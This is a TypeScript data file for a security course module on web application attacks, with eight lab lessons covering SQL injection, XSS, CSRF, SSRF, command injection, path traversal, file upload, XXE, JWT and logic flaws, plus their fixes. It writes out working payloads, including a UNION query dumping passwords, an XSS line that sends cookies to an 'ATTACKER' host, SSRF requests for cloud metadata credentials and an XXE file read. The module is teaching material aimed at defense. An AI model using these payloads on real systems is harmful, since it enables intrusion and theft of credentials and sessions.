import type { Module } from "../curriculum";

export const module31: Module = {
  id: "module-31",
  slug: "31-web-attacks-deep",
  title: "Web Application Attacks Deep",
  description:
    "The full OWASP menu executed: SQLi, XSS, CSRF, SSRF, command injection, path traversal, file upload, deserialization, XXE, JWT/API abuse, and business logic.",
  language: "Web AppSec",
  lessons: [
    {
      id: 1,
      slug: "01-sqli-deep",
      title: "SQL Injection Deep",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "Error-based, union-based, blind, time-based, second-order — and the parameterized-query fix, demonstrated and defended.",
      content: `
# SQL Injection Deep

## The injection family

| Type | How it manifests | Detection |
|------|------------------|-----------|
| **Error-based** | DB error leaks query shape | send a quote '\`' and read the error |
| **Union-based** | \`UNION SELECT\` merges rows | align column counts: \`ORDER BY n\` |
| **Boolean blind** | True/False differences in response | compare \`' AND 1=1\` vs \`' AND 1=2\` |
| **Time-based blind** | \`SLEEP(5)\` timing | measure response delay |
| **Second-order** | Stored payload fires later | store via one flow, trigger at another |

## Finding columns & dumping (lab)

\`\`\`
# column count walk:
' ORDER BY 1-- -   (then 2,3.. until error)
# union with matching columns:
' UNION SELECT 1,2,3-- -
# pull database/table/column names:
' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
# dump:
' UNION SELECT concat(user,0x3a,password),2,3 FROM users-- - (MySQL)
\`\`\`

## Blind shortcuts

- **sqlmap** (great accelerator, understand it):
\`\`\`
sqlmap -u 'http://10.0.0.20/search.php?a=1' --batch --dbs --tamper=space2comment
sqlmap -u 'http://10.0.0.20/login.php' --forms --batch
\`\`\`

## Defenses

1. **Parameterized queries** (the only real fix for classic SQLi)
2. Least-privilege DB account (app never connects as dba / sa)
3. WAF as throat-clearing (not a fix; and bypasses exist)
4. **Universal**: input validation for *type*, output parametrization, no dynamic SQL
5. Secret-handling: no query-spliced API keys

## Modern twist: NoSQL & ORM injection

- NoSQL (Mongo): \`{"$ne":null}\` operators
- ORMs: raw \`Query\`/entity-translation unsafe when concatenated; use builders/parameterized everywhere
- GraphQL (later module deeper)

> SQLi is the grandmaster of the injection family. Master *how it works*, not just 'run sqlmap'. The parameterized fix is your ambassador answer in every interview and every report.
`,
      defaultCode: `# Conceptual contrast (not real MySQL)
const unsafe = "SELECT * FROM users WHERE id = " + req.query.id;
const safe = db.query('SELECT * FROM users WHERE id = ?', [req.query.id]);
console.log('unsafe:', unsafe);
console.log('safe: id stays a parameter');`,
      solution: `const unsafe = "SELECT * FROM users WHERE id = " + req.query.id;
const safe = db.query('SELECT * FROM users WHERE id = ?', [req.query.id]);
console.log('unsafe:', unsafe);
console.log('safe: id stays a parameter');`,
      hint: "Parameterize + least-priv DB + never dynamic SQL lists = the SQLi triage.",
      challenge: `**Home Lab — The Classic Hands-On:**
1. On DVWA (LOW), visit SQL Injection; '1' then '\`' — note the error change.
2. Walk the union + column count; extract table names and one password hash.
3. repeat at 'MEDIUM' (was the parameter GET or POST?) and explore why.
4. Fix the *source* (given DVWA source) with a parameterized query; reupload in the lab variant; re-test.
5. Write the report-style finding.`,
    },
    {
      id: 2,
      slug: "02-xss-deep",
      title: "Cross-Site Scripting (XSS) Deep",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "Reflected, stored, DOM — session=stolen, keylogged, CSRF-chained; and the encoding/CSP/XSS-auditor defense stack.",
      content: `
# Cross-Site Scripting (XSS) Deep

## The three XSSs

| Type | Where it executes | Reach |
|------|-------------------|-------|
| **Reflected** | Your request's payload echoes into response (URL) | One-shot, no persistence |
| **Stored** | Payload saved to DB, served to anyone later | Max persistence |
| **DOM-based** | Client-side JS reads location.hash/DOM and sinks unsafely | Browser-only, no server echo |

## Payload craft

\`\`\`
<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert document.domain        # href/iframe/object sinks
<svg onload=alert(1)>
# polyglot-ish cloaking baseline:
<scr<x>ipt>alert(1)</scr</x>ipt>       # when sanitizers strip tags
\`\`\`

## Stealing the session (demo-level proof)

\`\`\`
// on a stored-XSS page (lab):
<img src=x onerror="fetch('http://ATTACKER/c?c='+document.cookie)">
// attacker logs:  tail -f access.log | grep 'c='
// -> session token exfiltrated; prove replay in Repeater
\`\`\`

## DOM particulars

- sinks: el.innerHTML, document.write, location, eval
- sources: location.hash, document.referrer, URL params read by JS
- Detect:  where client JS reads input AND writes unsafely

## Defense stack

1. **Encode on output in recipient context** (HTML, attr, JS, CSS, URL) — use framework auto-escaping (React/Django/Angular)
2. **Never use dangerouslySetInnerHTML/innerHTML with user data**
3. **CSP** (Content-Security-Policy): default-src 'self'; no inline unless 'unsafe-inline' hated; report-only first
4. **HttpOnly** cookies (session not readable by XSS)
5. **Sanitizer** for rich text (DOMpurify on client AND server)
6. **XSS-Auditor/filters** are legacy, incomplete — not a defense

## Detection-in-SIEM lens

- 'script' tags or onerror patterns in request payloads/POST bodies
- Cookie error: no; but follow the source: which endpoint did the token leave from?
`,
      defaultCode: `// What a CSP header looks like (strong default)
const header = [
  "default-src 'self'",
  "script-src 'self'",
  "object-src 'none'",
  "frame-ancestors 'none'"
].join('; ');
console.log('Content-Security-Policy:', header);`,
      solution: `const header = [
  "default-src 'self'",
  "script-src 'self'",
  "object-src 'none'",
  "frame-ancestors 'none'"
].join('; ');
console.log('Content-Security-Policy:', header);`,
      hint: "Context-encoded output + CSP + HttpOnly cookies defeats the classic XSS payoff.",
      challenge: `**Home Lab — Reflected to Stored:**
1. DVWA XSS (reflected): inject <script>alert(1)</script> in the input; view it.
2. Stored: post a payload to the guestbook; reload as another user → fires.
3. Upgrade: XSS-exfil a cookie in the lab and replay it (Repeater) to 'be' the victim.
4. Fix: DVWA source has the sink — identify encoding gap.
5. Write one YARA/rule style detection for XSS in your lab proxy logs.`,
    },
    {
      id: 3,
      slug: "03-csrf-ssrf",
      title: "CSRF & SSRF Attacks",
      level: "advanced",
      tag: "lab",
      duration: "45 min",
      description:
        "Cross-site request forgery and server-side request forgery — one comes in from the victim, the other goes out from your server.",
      content: `
# CSRF & SSRF Attacks

## CSRF: the victim's browser is the weapon

A logged-in user visits an attacker page; the page makes a request to the victim's app *with the victim's cookies*. The app thinks the victim did it.

\`\`\`
<!-- attacker page -->
<img src="https://app.example/transfer?to=attacker&amount=999">
<!-- cookie auto-sends; action executes -->
\`\`\`

### Why modern defenses exist

- **SameSite=Lax/Strict** cookies (browser won't send on cross-site POST)
- **CSRF tokens** (server-issued, per-session, validated)
- **Custom headers/origin checks** (double-submit tokens)

## SSRF: your server fetches attacker-controlled URLs

An app that exposes a 'fetch this URL' or image/PDF/import feature lets the attacker control WHERE the server connects.

\`\`\`
# classic cloud meta-data theft (AWS):
GET /import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# internal probing bypassing the firewall:
GET /proxy?url=http://127.0.0.1:8080/admin
GET /proxy?url=dict://user:pass@10.0.0.5:11211/   # gopher/dict protocols
\`\`\`

### Variants
- Full SSRF (response returned to attacker) vs blind (only observable via timing/error)
- Protocol tricks: http, file://, gopher, redirect-following to bypass URL filters

## SSRF defenses

1. **Denylist/allowlist** the destinations (allow only needed domains)
2. **Block link-local/loopback/metadata IPs** (169.254.169.254, 127.0.0.0/8, 0.0.0.0)
3. **Split network**: the fetch service runs egress-restricted, not on trusted DNs
4. **No credentials in the forging layer**; redirects disabled unless necessary
5. Detect: any outbound to metadata addresses = immediate alarm

> CSRF is identity-based trust; SSRF is server-side reach. Both break trust boundaries you didn't realize existed.
`,
      defaultCode: `// SSRF URL validation sketch (allowlist approach)
const allowedHosts = new Set(['img.cdn.example']);
function safeFetch(url) {
  const u = new URL(url);
  const ok = allowedHosts.has(u.hostname) &&
     !/^(127\\.|169\\.254\\.|0\\.)/.test(u.hostname);
  console.log(u.hostname, ok ? 'ALLOW' : 'DENY');
  return ok;
}
safeFetch('http://grafana.example/admin');
safeFetch('http://169.254.169.254/latest/meta-data');`,
      solution: `const allowedHosts = new Set(['img.cdn.example']);
function safeFetch(url) {
  const u = new URL(url);
  const ok = allowedHosts.has(u.hostname) &&
     !/^(127\\.|169\\.254\\.|0\\.)/.test(u.hostname);
  console.log(u.hostname, ok ? 'ALLOW' : 'DENY');
  return ok;
}
safeFetch('http://grafana.example/admin');
safeFetch('http://169.254.169.254/latest/meta-data');`,
      hint: "Allowlist destinations; block loopback/metadata; isolate the fetch namespace.",
      challenge: `**Home Lab — Build Both Test Beds:**
1. CSRF: in DVWA's CSRF page, capture the POST needed to change details; craft the <img> attack; verify it executes.
2. Then enable SameSite/verify token in the 'source' and re-test.
3. SSRF: on a lab app (or one you code), provide a 'fetch URL' feature; test the metadata IP returns/identifies.
4. Fix the SSRF in code (scheme + IP checks).
5. Write both as findings with severity + fix.`,
    },
    {
      id: 4,
      slug: "04-command-injection-traversal-upload",
      title: "Command Injection, Path Traversal & File Upload",
      level: "intermediate",
      tag: "lab",
      duration: "45 min",
      description:
        "RCE via unsanitized shell, reading anything via .., and turning an upload into a webshell — the endgame trio of file-facing flaws.",
      content: `
# Command Injection, Path Traversal & File Upload

## Command injection

An app that shells out (ping, convert, ffmpeg) and splices user input into the command:

\`\`\`
# find the seam:
child_process.exec('ping -c 1 ' + host)
# inject:
host=127.0.0.1; whoami
127.0.0.1 & dir
$(cat /etc/passwd)
\`\`\`

### Detection automation
- **commix** — the purpose-built scanner; understand its chunked-payload craft
- Test every parameter that feeds a command-taking function

### Defense
- Never build commands from input; use parameterized exec (spawn/execFile with arg array)
- Or strict allowlist input charset (hostnames only)
- Egress-segment the shell host if unavoidable

## Path traversal (LFI/TFI)

\`\`\`
../../../../etc/passwd
..\\..\\..\\Windows\\win.ini
%2e%2e%2f%2e%2e%2f  (encoded)
/FirstParam/../../etc/passwd   (middle traversal)
\`\`\`
Read app source, configs, or the OS — often escalates to RCE (LFI→phar/RFI→webshell).

### Defense
- Canonicalize (path.resolve) then ensure within base dir
- Never join user input into paths raw; serve files by ID not path

## Insecure file upload

- Upload endpoint trusts filename+MIME → PHP/JSP/ASP uploaded and executed on server
\`\`\`
# upload shell.php (mime-lied as image); access /uploads/shell.php
# -> RCE on the web user
\`\`\`

### Nastier variants
- Double extensions (shell.php.jpg beat weak filters), case tricks (pHp), null bytes (exploit-era)
- Content-type sniffing mismatch (image/x-... actually text)
- **Zip bomb / polyglots** as DoS/unexpected-parse

### Defense
- Whitelist EXTENSION by signature (check Magic Bytes, not MIME only)
- Store uploads OUTSIDE webroot; serve via controlled handler with Content-Disposition
- AV-scan (ClamAV) + quarantined, random filenames; no user-controlled path

> These three are the classic "I can get a shell" flaws. Their defense is structural: never splice data into files/commands; serve, don't execute.
`,
      defaultCode: `// cumulative upload validation sketch
function validateUpload(file) {
  const magic = file.peekSignature(); // GIF/PNG/JPEG/PDF...
  const ext = file.ext.toLowerCase();
  const allowed = ['png','jpg','gif','pdf'];
  const sigOk = MAGIC_SIGS[file.mime].includes(magic);
  const extOk = allowed.includes(ext) && !ext.includes('.');
  return sigOk && extOk;
}
console.log('validate:', validateUpload({ ext: 'php', mime: 'image/png' }));`,
      solution: `function validateUpload(file) {
  const magic = file.peekSignature();
  const ext = file.ext.toLowerCase();
  const allowed = ['png','jpg','gif','pdf'];
  const sigOk = MAGIC_SIGS[file.mime].includes(magic);
  const extOk = allowed.includes(ext) && !ext.includes('.');
  return sigOk && extOk;
}
console.log('validate:', validateUpload({ ext: 'php', mime: 'image/png' }));`,
      hint: "Signature-truth uploads + canonicalized paths + no shell-worthy exec = the trio fixed.",
      challenge: `**Home Lab — The Endgame Trio:**
1. DVWA command-injection page: execute id/whoami (LOW).
2. Path traversal: read /etc/passwd via the file/include page (LOW).
3. Upload page: bypass the weak extension check with a .php 'image' — reach the shell.
4. Fix each in source (code-level: no splices); re-test.
5. Write the 3 findings, severity + fix, reminder of 'don't do these against real systems'.`,
    },
    {
      id: 5,
      slug: "05-deserialization-xxe",
      title: "Insecure Deserialization & XXE",
      level: "advanced",
      tag: "lab",
      duration: "45 min",
      description:
        "Object injection, gadget chains, and XML external entities — where structured data becomes code and files leak through old parsers.",
      content: `
# Insecure Deserialization & XXE

## Insecure deserialization (A08)

Serializing user-supplied bytes into objects. If the class gadget chain is in scope, arbitrary code executes:

- Java (ysoserial gadgets), PHP (phar/laravel), Python (pickle flood, yaml load)
- Object deserialization ≠ JSON parse (safe); it's the *native* format

\`\`\`
# php unserialize() with attacker payload -> property injection
# java ObjectInputStream with ysoserial gadget -> Runtime.getRuntime().exec()
# pickles: pickle.loads(attacker_bytes) -> execute
\`\`\`

### Why it's scary
- Often unauthenticated, and the whole app is a deserialization target
- Detection is hard (HTTP body is opaque binary structure)

### Defenses
- Prefer JSON/text protocols; **never** expose native deserialization to users
- Sign+tamper-check serialized state (session.sign, JWT)
- Allowlist classes (Java ObjectInputFilter, php allowed_classes=false)
- Keep libraries patched (gadgets depend on versions)
- Detect: WAF-aware signatures are weak; rely on runtime tools (Java agent, .NET serializer checks)

## XXE (XML External Entity)

Legacy parsers (libxml old) can expand entities that read local files or hit URLs:

\`\`\`
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>        <!-- discloses /etc/passwd in response -->

<!-- blind/network: -->
<!ENTITY xxe SYSTEM "http://attacker:8080/data">
\`\`\`

### Detection
XML input (SOAP, SVG upload, RSS import, DTD elsewhere), disabled external entities.
- **xxe-based**: try a single file read; then blind via OOB (external DTD)

### Defenses
- Disable external entity resolution: \`'libxml_disable_entity_loader(true)'\`, XXE false in parsers
- Never parse untrusted XML if avoidable (JSON/JSON-Schema instead)
- If XML required: restrict DTDs, disable external-general entities entirely

> Deserialization: bytes → objects → code. XXE: entity → file → response. Both are 'the parser trusted the format more than the content'.
`,
      defaultCode: `// (best-practice) never run pickle.loads on user data
// safe pattern: JSON only, no native deserialization of untrusted bytes
const allowed = new Set(['json','application/vnd.api+json']);
function canParse(contentType) {
  return allowed.has(contentType.split(';')[0].trim().toLowerCase());
}
console.log('parses:', canParse('application/x-java-serialized-object'));`,
      solution: `const allowed = new Set(['json','application/vnd.api+json']);
function canParse(contentType) {
  return allowed.has(contentType.split(';')[0].trim().toLowerCase());
}
console.log('parses:', canParse('application/x-java-serialized-object'));`,
      hint: "Prefer text protocols; disable native deserialization + external XML entities.",
      challenge: `**Home Lab — See It (JSON-safe):**
1. In a lab app with XML input (or use DVWA's XML page / a tiny server you code), send the XXE DTD payload and read a local file.
2. Confirm the OOB/XXE via logs.
3. Fix: disable entity resolution; re-attempt.
4. Deserialization: read up on Java ysoserial gadget theory only; DO NOT run on anything real.
5. Write 4 lines: where does your own project deserialize untrusted bytes or parse untrusted XML?`,
    },
    {
      id: 6,
      slug: "06-jwt-api-security",
      title: "JWT Attacks & API Security",
      level: "advanced",
      tag: "lab",
      duration: "45 min",
      description:
        "alg:none, key-confusion, signing/verification gaps, replay, JWKS endpoint poisoning — and API authz mistakes that leak everything.",
      content: `
# JWT Attacks & API Security

## How JWT is (mis)used

JSON Web Tokens = claims + signature. Server 'verifies' but trust must be earned. Common flaws:

| Flaw | Demo |
|------|------|
| **alg:none** | \`{"alg":"none","typ":"JWT"}\` + payload + empty signature — accepted by naive verifiers |
| **RS256→HS256 confusion** | treat the RSA **public key** bytes as the HMAC secret; forge with that 'secret' |
| **Weak secret** (HS256) | hashcat -m 16500 with rockyou → forge |
| **Missing exp/iat** | tokens are forever (or long-lived) |
| **jku/x5u poisoning** | point 'jku' to your JWKS → server fetches YOU |
| **kid injection / path traversal** | kid => path to file → server uses YOUR file |
| **Replay** | no nonce/jti/one-time semantics |

## Verify-before-trust checklist

1. Validate signature with the **configured** public key (from trusted JWKS)
2. Hard-require alg (deny 'none'); never accept key from the token
3. Check exp/iat/aud/iss claims
4. Rotate signing keys; revoke on logout (real revocation = hard; short exp helps)
5. Own the JWKS endpoint & its retrieval (allowlisted URL)

## API security (the modern app surface)

- **BOLA / IDOR**: object-level authz missing (GET /orders/{otherUserId})
- **BFLA**: function-level authz (low-priv calling admin function)
- **Mass assignment**: \`PUT /users\` with role=admin JSON
- **Rate limiting**: enumeration, brute, scraping
- **Pagination abuse**: deep pages bypass perf limits (DoS)
- **Verb confusion**: alternate methods (PUT vs PATCH) performing same action with weaker checks

\`\`\`
# manual API probing (Repeater):
GET /api/users/1   -> 200 (me?)
GET /api/users/2   -> 200 (neighbors!)
PUT /api/users/me {"role":"admin"}  -> accepted?
POST /api/search {"q":"*"}  -> mass enumeration?
\`\`\`

## Defense is boring and effective

- Centralize authz: one middleware checks object ownership every access
- Field-level allowlists on writes; reject unknown fields
- Enforce rate limits + logging; add jti nonces for replay protection
> APIs make appsec *mechanical*: authorize per object, verify per signature, rate-limit per identity.
`,
      defaultCode: `const jwt = require('jsonwebtoken'); // example libraries
// pseudo-fix: explicit algorithm, keyed only from trusted source
const opts = {
  algorithms: ['HS256'],            // <= never allow 'none'/'HS' from token
  issuer: 'api.example.com',
  maxAge: '1h'
};
console.log('verify(), not just decode()  →', 'use opts:', JSON.stringify(opts));`,
      solution: `const opts = { algorithms: ['HS256'], issuer: 'api.example.com', maxAge: '1h' };
console.log('verify(), not just decode()');
// hint: confirm('jwt.verify(token, secret, opts)') is the pattern`,
      hint: "alg allowlist + iss/exp checks + trusted JWKS + object-level authz = API hygiene.",
      challenge: `**Home Lab — JWT Playground:**
1. Mint tokens at jwt.io with your own secret.
2. Write a tiny Node/Python server that VERIFIES. First: verify with wrong alg/none → accept? fix so it rejects.
3. Try HS256 confusion: sign with the public key as secret; see your verifier reject after you fix alg check.
4. On a lab API (or your own), test per-object authz: GET neighbors' records.
5. Write the API hardening checklist you'd hand a dev.`,
    },
    {
      id: 7,
      slug: "07-business-logic-authz",
      title: "Business Logic Flaws & AuthZ Gaps",
      level: "advanced",
      tag: "lab",
      duration: "40 min",
      description:
        "Hidden flows, state machines, currency, quota and permission misdesigns — the flaws scanners never find because they require *understanding*.",
      content: `
# Business Logic Flaws & AuthZ Gaps

## Why scanners miss logic flaws

A scanner sends mutated payloads. A logic flaw requires reading the *feature*: pricing, gift cards, state transitions, permissions — the app's own business rules become the exploit.

## Flavor menu

| Flaw | Pattern |
|------|---------|
| **Price tampering** | Change price/qty/currency in request body |
| **Coupon abuse** | Reuse once-coupons; negative quantities; race |
| **Balance manipulation** | Withdraw → deposit race (double-spend) |
| **State-skip** | Jump from 'cart' straight to 'shipped' by calling admin API |
| **Race conditions** | Two requests win one credit (TOCTOU) |
| **Rate-limit evasion** | Rotate User-Agent, IP, or header tricks on login |
| **Referral/fraud** | Self-referral loops, fake KYC onboarding |

## The manual test rhythm

- Read the flow: what transitions are allowed? What's enforced client-side only?
- Tamper the request you can control (Repeater): price field, step number, role, quantity
- Run the same action twice quickly (race) — the DB writes twice
- Look for 'hidden' endpoints the frontend uses but UI hides

\`\`\`
# classic spot:
POST /cart/checkout {"price":10}   # set price server-side!
GET /api/order/state              # can you PATCH step from 'review' to 'complete'?
POST /vouchers/redeem {"code":"FREEDEL"}  # twice in a row?
\`\`\`

## AuthZ gaps (IDOR/BOLA reprise, deepened)

- Object-level: any ID works (neighbors)
- Batch: bulk endpoints with mixed permissions
- Missing hierarchy: user vs admin role toggled only by cookie flag
- **Brain**: object ACL enforced at a different layer (UI, not API)

## Fix culture

- Server-side state machine for transitions (never client hints)
- Price/qty/role fields server-derived, user hints rejected
- Idempotency keys for money-moving endpoints (race killer)
- Central authz middleware (single enforcement point, tested)
- Boundary/write-audit tests for money + privilege features

> Logic flaws are the AppSec 'intelligence' exam: 95% infrastructure, 5% privilege. The privilege part wins money and data.
`,
      defaultCode: `// money-moving endpoints need exactness
let balance = 100;
function transfer(amount, idempotencyKey, seenKeys) {
  if (seenKeys.has(idempotencyKey)) return false;       // race guard
  seenKeys.add(idempotencyKey);
  if (!Number.isInteger(amount) || amount <= 0) return false;
  balance -= amount;
  return true;
}
console.log('transfer negative?', transfer(-5, 'k1', new Set()));
console.log('transfer twice?', transfer(50, 'k1', new Set()));`,
      solution: `let balance = 100;
function transfer(amount, idempotencyKey, seenKeys) {
  if (seenKeys.has(idempotencyKey)) return false;
  seenKeys.add(idempotencyKey);
  if (!Number.isInteger(amount) || amount <= 0) return false;
  balance -= amount;
  return true;
}
console.log('transfer negative?', transfer(-5, 'k1', new Set()));
console.log('transfer twice?', transfer(50, 'k1', new Set()));`,
      hint: "Server-state, idempotency keys, single authz layer = logic flaws closed.",
      challenge: `**Home Lab — Reason Through a Flow:**
1. Pick a payment-enabled LEGO in your lab (or a fake checkout page you code).
2. Attack: change price; change quantity; replay redeemo/state jump.
3. Test the race: two checkout requests — do both succeed?
4. Fix the code: server-set price + idempotency.
5. Write your finding: what business rule did your flow fall short on?`,
    },
    {
      id: 8,
      slug: "08-web-app-secure-coding-review",
      title: "From Attack to Fix: Secure Web Review",
      level: "advanced",
      tag: "lab",
      duration: "50 min",
      description:
        "A full-cycle exercise: enumerate a story-driven vulnerable web app, exploit the top findings, then patch the source and re-audit.",
      content: `
# From Attack to Fix: Secure Web Review

## The capstone exercise

You know the OWASP menu. Now execute a mini-assessment start-to-finish on a lab web app you control — DVWA, bWAPP, or one you scaffold.

## Engagement it

1. **Scope**: one app instance, all features, write down exclusions
2. **Enumerate**: robots.txt, headers, tech stack, endpoint inventory (ffuf/gobuster)
3. **Map flows**: login, search, profile — where do inputs cross trust boundaries?
4. **Test the OWASP set**: authZ, injection, crypto, misconfig, components, sessions, logging, SSRF
5. **Prioritize**: 3 findings max, evidence-heavy
6. **Fix**: patch the source (parameterize, encode output, centralize authz)
7. **Re-test**: confirm the exploit no longer works; no regressions

## The disciplined table

\`\`\`
| # | Layer | Finding | OWASP | Severity | Repro | Fix |
|---|-------|---------|-------|----------|-------|-----|
| 1 | App    | SQLi in search | A03 | High | union payload | parameterized |
| 2 | App    | Stored XSS     | A03 | High | script in guestbook | encode output |
| 3 | Auth   | Weak session cookie | A07 | Med  | HttpOnly off | flags        |
\`\`\`

## Code-review pass (after fixing)

- \`SELECT\` with parameters everywhere? (grep for concat/query-string building)
- All user output through escape helpers?
- Authz middleware: one place, called for every object access?
- Secrets: .env only, gitignored?
- Uploads stored outside webroot with magic-byte checks?
- CSP header set; dependency audit green?

## Deliverable

A one-page executive summary + detailed appendix (repro, evidence, validation). This exercise = your first 'right-handed' piece of proficiency proof.

> You now hold the whole cycle: attack → prove → explain → fix → re-verify. That loop is what 'application security engineer' means in practice.
`,
      defaultCode: `// The audit checklist as code
const checklist = [
  'parameterized queries everywhere',
  'output encoding in all render contexts',
  'single authz middleware per object',
  'secrets in env, none in repo',
  'uploads out-of-webroot + magic-byte check',
  'CSP + HSTS headers',
  'dependency audit clean'
];
checklist.forEach(item => console.log((tests[item] ? '[x] ' : '[ ] ') + item));`,
      solution: `const checklist = [
  'parameterized queries everywhere',
  'output encoding in all render contexts',
  'single authz middleware per object',
  'secrets in env, none in repo',
  'uploads out-of-webroot + magic-byte check',
  'CSP + HSTS headers',
  'dependency audit clean'
];
checklist.forEach(item => console.log((tests[item] ? '[x] ' : '[ ] ') + item));`,
      hint: "Full loop: enumerate, exploit, prioritize, patch, re-verify — evidence throughout.",
      challenge: `**Home Lab — The Capstone:**
1. Pick DVWA (LOW→MEDIUM) or bWAPP.
2. Full-cycle: enumerate (ffuf/gobuster), test 6 OWASP categories, choose 3 findings.
3. In source, patch: parameterize SQL, encode output, set session flags.
4. Re-exploit: confirm old path dead; confirm happy path still works.
5. Write the 1-page exec summary + 3 finding records. Save it.`,
    },
  ],
};